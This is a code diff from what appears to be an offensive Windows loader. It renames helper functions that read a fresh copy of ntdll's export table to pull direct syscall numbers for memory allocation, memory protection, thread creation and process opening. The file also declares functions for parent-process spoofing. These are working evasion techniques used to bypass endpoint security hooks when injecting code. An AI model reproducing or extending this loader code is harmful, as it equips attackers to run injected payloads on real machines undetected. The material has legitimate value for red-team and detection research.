@@ -3,9 +3,9 @@
 #include "includes/Native.h"
 
 // Function prototypes
-void Gate_GetImageExportDirectory(LPVOID imageBase, PIMAGE_EXPORT_DIRECTORY* ppNtdllExportDirectory);
-void* Gate_GetProcAddress(LPVOID imageBase, LPCSTR toFind);
-WORD Gate_GetSyscallNumber(void* addr);
+void Hypnos_GetImageExportDirectory(LPVOID imageBase, PIMAGE_EXPORT_DIRECTORY* ppNtdllExportDirectory);
+void* Hypnos_GetProcAddress(PVOID imageBase, LPCSTR toFind);
+WORD Hypnos_GetSyscallNumber(void* addr);
 DWORD FindProcess(const char* name);
 HANDLE SpoofProcessPPID(LPCSTR toSpawn, LPCSTR parentName);
 void* getNtdllCopy();
@@ -19,21 +19,23 @@ PSYSCALL_TABLE InitSyscalls() {
     LPVOID ntdllCopy = getNtdllCopy();
     
     table->NtAllocateVirtualMemory.name = "NtAllocateVirtualMemory";
-    table->NtAllocateVirtualMemory.num = Gate_GetSyscallNumber(Gate_GetProcAddress(ntdllCopy, "NtAllocateVirtualMemory"));
+    table->NtAllocateVirtualMemory.num = Hypnos_GetSyscallNumber(
+            Hypnos_GetProcAddress(ntdllCopy, "NtAllocateVirtualMemory"));
     
     table->NtProtectVirtualMemory.name = "NtProtectVirtualMemory";
-    table->NtProtectVirtualMemory.num = Gate_GetSyscallNumber(Gate_GetProcAddress(ntdllCopy, "NtProtectVirtualMemory"));
+    table->NtProtectVirtualMemory.num = Hypnos_GetSyscallNumber(
+            Hypnos_GetProcAddress(ntdllCopy, "NtProtectVirtualMemory"));
     
     table->NtCreateThreadEx.name = "NtCreateThreadEx";
-    table->NtCreateThreadEx.num = Gate_GetSyscallNumber(Gate_GetProcAddress(ntdllCopy, "NtCreateThreadEx"));
+    table->NtCreateThreadEx.num = Hypnos_GetSyscallNumber(Hypnos_GetProcAddress(ntdllCopy, "NtCreateThreadEx"));
     
     table->ZwOpenProcess.name = "ZwOpenProcess";
-    table->ZwOpenProcess.num = Gate_GetSyscallNumber(Gate_GetProcAddress(ntdllCopy, "ZwOpenProcess"));
+    table->ZwOpenProcess.num = Hypnos_GetSyscallNumber(Hypnos_GetProcAddress(ntdllCopy, "ZwOpenProcess"));
 
     return table;
 }
 
-void Gate_GetImageExportDirectory(LPVOID imageBase, PIMAGE_EXPORT_DIRECTORY* ppNtdllExportDirectory) {
+void Hypnos_GetImageExportDirectory(LPVOID imageBase, PIMAGE_EXPORT_DIRECTORY* ppNtdllExportDirectory) {
     // Getting DOS header
     PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)imageBase;
     // Getting NT headers
@@ -42,9 +44,9 @@ void Gate_GetImageExportDirectory(LPVOID imageBase, PIMAGE_EXPORT_DIRECTORY* ppN
     *ppNtdllExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)imageBase + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
 }
 
-void* Gate_GetProcAddress(PVOID imageBase, LPCSTR toFind) {
+void* Hypnos_GetProcAddress(PVOID imageBase, LPCSTR toFind) {
 	PIMAGE_EXPORT_DIRECTORY pNtdllExportDirectory;
-	Gate_GetImageExportDirectory(imageBase, &pNtdllExportDirectory);
+    Hypnos_GetImageExportDirectory(imageBase, &pNtdllExportDirectory);
 
 	PDWORD pdwFunctionNames = (PDWORD)((PBYTE)imageBase + pNtdllExportDirectory->AddressOfNames);
 	PDWORD pdwFunctionAddresses = (PDWORD)((PBYTE)imageBase + pNtdllExportDirectory->AddressOfFunctions);
@@ -62,7 +64,7 @@ void* Gate_GetProcAddress(PVOID imageBase, LPCSTR toFind) {
 	return NULL;
 }
 
-WORD Gate_GetSyscallNumber(void* addr) {
+WORD Hypnos_GetSyscallNumber(void* addr) {
 	return (WORD)*((PBYTE)addr + 4);
 }
 
